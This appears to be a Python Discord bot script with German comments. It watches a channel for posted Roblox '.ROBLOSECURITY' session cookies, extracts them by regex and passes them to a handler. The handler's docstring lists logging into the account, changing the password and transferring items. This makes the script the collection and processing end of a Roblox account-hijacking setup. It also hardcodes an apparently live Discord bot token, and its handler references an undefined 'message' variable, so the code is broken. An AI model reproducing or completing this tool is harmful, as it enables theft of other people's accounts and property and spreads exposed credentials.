import discord
import os
import re

# --- Konfiguration ---
# WICHTIG: Ersetzen Sie dies mit Ihrem tatsächlichen Discord Bot Token.
# Es ist ratsam, Tokens nicht direkt im Code zu speichern, sondern Umgebungsvariablen zu verwenden.
# Beispiel: DISCORD_BOT_TOKEN = os.environ.get("DISCORD_BOT_TOKEN")
DISCORD_BOT_TOKEN = "MTU1Mzg0NjgyODIwMDM2MTk4NA.G7JJQc.t2nB8PGN5kU889-juHINHSs8CvtMMfLdx5yNSk"

# WICHTIG: Ersetzen Sie dies mit der ID des Discord-Kanals, den der Bot überwachen soll.
TARGET_CHANNEL_ID = 1549364715753439242 # Beispiel-ID, bitte ersetzen!

# --- Regulärer Ausdruck für die Cookie-Extraktion ---
# Dieser Regex sucht nach ".ROBLOSECURITY=" und erfasst dann alle Zeichen (nicht-gierig),
# bis er auf eines der definierten Trennmuster trifft.
# Muster 1: Ein optionales Leerzeichen gefolgt von "|WARNING:"
# Muster 2: Das von Ihnen angegebene Ende: ", "/", ".roblox.com")))"
# Die nicht-fangende Gruppe (?:...) stellt sicher, dass die Trennmuster selbst nicht extrahiert werden.
# re.DOTALL sorgt dafür, dass der Punkt auch Zeilenumbrüche einschließt.
COOKIE_VALUE_PATTERN = re.compile(
    r"\.ROBLOSECURITY=(.*?)(?:\s*\|WARNING:|, \"/\", \".roblox\.com\"\)\)\))",
    re.DOTALL
)

# --- Bot-Setup ---
# Standard-Intents aktivieren und den Intent für Nachrichteninhalt explizit setzen.
intents = discord.Intents.default()
intents.message_content = True # Dies ist notwendig, um auf Nachrichteninhalt zuzugreifen.

# Client-Instanz mit den konfigurierten Intents erstellen.
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    """
    Diese Funktion wird automatisch aufgerufen, wenn der Bot erfolgreich eine Verbindung zu Discord hergestellt hat.
    Sie dient zur Initialisierung und zur Anzeige von Statusmeldungen in der Konsole.
    """
    print(f'Erfolgreich eingeloggt als {client.user.name} (ID: {client.user.id})')
    print('---------------------------------------------------')
    print('Bot ist bereit und überwacht den Kanal.')
    # Eine Statusnachricht setzen (optional)
    await client.change_presence(activity=discord.Game(name=f"Überwachung von Kanal ID: {TARGET_CHANNEL_ID}"))

@client.event
async def on_message(message):
    """
    Diese Funktion wird jedes Mal aufgerufen, wenn eine Nachricht in einem Kanal gesendet wird,
    auf den der Bot Zugriff hat.
    """
    # Ignoriere Nachrichten vom Bot selbst, um Endlosschleifen zu vermeiden.
    if message.author == client.user:
        return

    # Prüfe, ob die Nachricht im Zielkanal empfangen wurde.
    if message.channel.id == TARGET_CHANNEL_ID:
        print(f"\n--- Nachricht empfangen im Zielkanal ({message.channel.name}) ---")
        print(f"Von: {message.author.name} ({message.author.id})")
        # Hier wird nur ein Teil der Nachricht angezeigt, um die Konsole übersichtlich zu halten.
        # Das vollständige message.content ist für die Regex-Suche verfügbar.
        print(f"Inhalt (erste 100 Zeichen): {message.content[:100]}{'...' if len(message.content) > 100 else ''}")

        # Versuche, den Roblox-Cookie-Wert aus dem Nachrichteninhalt zu extrahieren.
        match = COOKIE_VALUE_PATTERN.search(message.content)

        if match:
            # Wenn ein Treffer gefunden wurde, enthält group(1) den eigentlichen Cookie-Wert.
            roblox_cookie_value = match.group(1).strip() # .strip() entfernt führende/nachfolgende Leerzeichen
            print(f"Roblox Cookie Wert erfolgreich extrahiert.")
            # Zeige einen gekürzten Teil des Cookies zur Verifizierung in der Konsole.
            print(f"Extrahiert (erste 20 Zeichen): {roblox_cookie_value[:20]}...")

            # Rufe die Funktion auf, die den extrahierten Cookie-Wert weiterverarbeitet.
            await process_roblox_cookie(roblox_cookie_value, message.channel)
        else:
            # Wenn kein Cookie gefunden wurde, sende eine informierende Nachricht an den Kanal.
            print("Kein Roblox-Cookie im erwarteten Format gefunden.")
            await message.channel.send(
                f"Entschuldigung, {message.author.mention}, ich konnte keinen Roblox-Cookie in dem von Ihnen gesendeten Nachrichtenformat erkennen. "
                f"Bitte stellen Sie sicher, dass der Cookie mit `.ROBLOSECURITY=` beginnt und das erwartete Format hat."
            )

async def process_roblox_cookie(cookie_value: str, channel: discord.TextChannel):
    """
    Diese Funktion dient als zentraler Punkt für die Verarbeitung des extrahierten Roblox-Cookie-Werts.
    Hier können Sie die Logik einfügen, um:
    1. Den Cookie zu validieren (optional).
    2. Sich mit dem Cookie bei Roblox anzumelden.
    3. Weitere Aktionen durchzuführen (z. B. Passwort ändern, Items übertragen etc.).
    4. Ergebnisse oder Statusmeldungen an den Discord-Kanal zu senden.

    Args:
        cookie_value (str): Der extrahierte Roblox-Cookie-Wert.
        channel (discord.TextChannel): Der Kanal, in dem die ursprüngliche Nachricht empfangen wurde,
                                        um darauf antworten zu können.
    """
    print(f"\n--- Starte Verarbeitung des Cookies ---")
    print(f"Cookie-Wert (gekürzt): {cookie_value[:20]}...")

    # Hier kommt Ihre spezifische Automatisierungslogik für Roblox.
    # Zum Beispiel:
    # - Sie könnten eine Funktion aufrufen, die ein 'requests'-Objekt mit dem Cookie erstellt.
    # - Diese Funktion könnte dann versuchen, eine Roblox-API abzufragen, um die Authentifizierung zu prüfen.
    # - Basierend auf dem Erfolg oder Misserfolg senden Sie eine Antwort an den Kanal.

    # Beispielhafte Antwort:
    response_message = f"{message.author.mention}, der Roblox-Cookie wurde erfolgreich empfangen und zur Verarbeitung übermittelt. "
    response_message += f"Der Wert beginnt mit: `{cookie_value[:20]}...`."

    # Simulieren Sie eine erfolgreiche Verarbeitung
    print("Simuliere erfolgreiche Verarbeitung und sende Bestätigung an den Kanal.")
    await channel.send(response_message)
    print("--- Verarbeitung des Cookies abgeschlossen ---")

# --- Bot starten ---
if __name__ == "__main__":
    print("Starte Discord Bot...")
    try:
        # Versucht, den Bot mit dem bereitgestellten Token zu starten.
        client.run(DISCORD_BOT_TOKEN)
    except discord.errors.LoginFailure:
        print("FEHLER: Ungültiger Discord Bot Token.")
        print("Bitte überprüfen Sie, ob der DISCORD_BOT_TOKEN korrekt gesetzt ist.")
    except Exception as e:
        print(f"Ein unerwarteter Fehler ist beim Starten des Bots aufgetreten: {e}")
